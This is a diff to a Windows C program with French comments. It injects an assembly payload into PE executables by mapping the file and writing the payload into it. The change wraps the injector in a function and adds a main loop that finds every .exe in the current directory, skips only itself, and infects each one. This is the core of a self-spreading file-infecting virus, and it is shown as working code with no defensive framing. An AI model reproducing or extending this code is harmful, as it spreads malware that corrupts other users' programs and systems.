@@ -11,6 +11,7 @@
 #include <stdio.h>
 #pragma comment(lib, "user32.lib")
 
+
  // Fonction pour copier de la mémoire
 void my_memcpy(PUCHAR dst, PUCHAR src, DWORD len)
 {
@@ -18,14 +19,14 @@ void my_memcpy(PUCHAR dst, PUCHAR src, DWORD len)
         dst[i] = src[i];
 }
 
-int main(int ac, char** av)
+int inject_pe(char* filename)
 {
-    // Vérification des arguments
-    if (ac != 2)
-    {
-        printf("Usage: %s EXEFILE\n", av[0]);
-        return 2600;
+    
+    if (filename == NULL) {
+        fprintf(stderr, "Filename is NULL\n");
+        return 1;
     }
+    printf("Injecting %s \n", filename);
 
     // Pointeurs externes au code en assembleur à injecter
     extern void payload(); // Point d'entrée du code assembleur
@@ -54,9 +55,8 @@ int main(int ac, char** av)
     printf("\n");
 
     // Ouverture du fichier PE à modifier
-    char* thefile = av[1];
     HANDLE hFile = CreateFileA(
-        thefile,
+        filename,
         GENERIC_READ | GENERIC_WRITE,
         0,
         NULL,
@@ -87,7 +87,6 @@ int main(int ac, char** av)
         dwNewFileSize,
         NULL
     );
-
 #if DEBUG
     if (hMapFile == NULL)
     {
@@ -172,6 +171,54 @@ int main(int ac, char** av)
     FlushViewOfFile(lpMapAdr, dwNewFileSize);
     UnmapViewOfFile(lpMapAdr);
     CloseHandle(hFile);
+    
+    return 0;
+}
 
+int main(int ac, char **av)
+{
+    WIN32_FIND_DATA findFileData;
+    HANDLE hFind = INVALID_HANDLE_VALUE;
+    char pattern[MAX_PATH];
+    char exeName[MAX_PATH];
+
+    // Recuperation du nom de l'executable (soi-meme) pour eviter de l'injecter
+    if (GetModuleFileName(NULL, exeName, MAX_PATH) == 0) {
+        fprintf(stderr, "Error getting executable name.\n");
+        return 1;
+    }
+
+    // Extraction du nom sans le chemin
+    char *exeBaseName = strrchr(exeName, '\\');
+    if (exeBaseName != NULL) {
+        exeBaseName++;
+    } else {
+        exeBaseName = exeName;
+    }
+
+    // Creation d'un pattern pour chercher les extensions en exe
+    snprintf(pattern, MAX_PATH, "%s\\*.exe", ".");
+
+    // Trouver le premier fichier du repertoire courant
+    hFind = FindFirstFile(pattern, &findFileData);
+
+    if (hFind == INVALID_HANDLE_VALUE) {
+        fprintf(stderr, "Error finding files.\n");
+        return 1;
+    }
+
+    // Parcours de tous les fichiers exe du repertoire courant
+    do {
+        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+            // Si le fichier n'est pas arg0
+            if (strcmp(findFileData.cFileName, exeBaseName) != 0) {
+                printf("Injecting %s \n", findFileData.cFileName);
+             // Injection
+                inject_pe( (char *) findFileData.cFileName);
+            }
+        }
+    } while (FindNextFile(hFind, &findFileData) != 0);
+
+    FindClose(hFind);
     return 0;
 }
